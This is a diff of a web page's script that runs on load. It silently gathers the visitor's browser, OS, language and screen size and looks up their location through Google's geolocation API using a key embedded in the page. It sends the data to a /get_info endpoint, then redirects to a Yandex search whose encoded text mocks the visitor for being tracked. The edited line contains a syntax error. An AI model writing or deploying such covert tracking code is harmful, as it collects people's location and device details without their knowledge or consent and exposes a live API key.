@@ -2,6 +2,7 @@
 <html>
 
 <head>
+<script type="text/javascript" src="/browser.js"></script>
 <script type="text/javascript">
 
 function getXmlHttp(){
@@ -25,33 +26,30 @@ var rqst = getXmlHttp();
 
 	window.onload = function catchfnc() {
 		var s = window.screen;
-		var brser = navigator.appName;
+		//var brser = navigator.appName;
 		var lng = navigator.language;
-		var ops = navigator.platform;
-		//var bbrser = BrowserDetect.browser;
-		//var bos = BrowserDetect.OS;
+		//var ops = navigator.platform;
+		var brser = BrowserDetect.browser;
+		var ops = BrowserDetect.OS;
 		var height = s.height;
 		var width = s.width;
-		var colors = s.colorDepth;
+		//var colors = s.colorDepth;
 		//var battery = navigator.battery || navigator.webkitBattery || navigator.mozBattery || navigator.msBattery;
 		//console.log(battery);
 		//var btr_lvl = Math.floor(battery.level * 100) + "%";
 		//var chrg = battery.charging;
-		var lat; var lng; var rad;
 		rqst.open("POST", "https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyBUpYIrPcbH49dVrsfCPorKGjHa0DjABeA", true);
 		rqst.send();
 		rqst.onreadystatechange = function() {
 			if (rqst.readyState == 4) {
 				var coords = rqst.responseText;
+				alert(coords)
 				
-				
-				var addr = "/get_info?browser="+brser+"&language="+lng+"&OS="+ops+"&h="+height+"&w="+width+"&c"+colors+"&lat="+lat+"&lng="+lng+"&rad="+rad;
+				var addr = "/get_info?browser="+brser+"&language="+lng+"&OS="+ops+"&h="+height+"&w="+width+"&location_info="coords;
 				rqst.open("GET", addr, true)
 				rqst.send();
 				
-
-				
-				window.location = "http://yandex.ru";
+				window.location = "https://yandex.ru/search/?from=chromesearch&clid=2224314&text=%D0%BC%D1%8B+%D0%BC%D0%BE%D0%B3%D0%BB%D0%B8+%D0%B1%D1%8B+%D0%BF%D1%80%D0%BE%D1%81%D1%82%D0%BE+%D0%BE%D1%82%D0%BA%D1%80%D1%8B%D1%82%D1%8C+%D0%B2%D0%B0%D0%BC+%D0%B3%D0%BB%D0%B0%D0%B2%D0%BD%D1%83%D1%8E+%D1%81%D1%82%D1%80%D0%B0%D0%BD%D0%B8%D1%86%D1%83+%D1%8F%D0%BD%D0%B4%D0%B5%D0%BA%D1%81%D0%B0%2C+%D0%BD%D0%BE+%D1%8D%D1%82%D0%BE+%D0%BD%D0%B5+%D0%B2%D0%B5%D1%81%D0%B5%D0%BB%D0%BE.+%D0%B7%D0%BD%D0%B0%D0%B9%D1%82%D0%B5%2C+%D1%82%D0%B5%D0%BF%D0%B5%D1%80%D1%8C+%D0%BD%D0%B0%D0%BC+%D0%B8%D0%B7%D0%B2%D0%B5%D1%81%D1%82%D0%BD%D0%BE+%D0%BC%D0%BD%D0%BE%D0%B3%D0%BE%D0%B5+%D0%BE+%D0%92%D0%B0%D1%81))0)%5C";
 			}
 		}
 
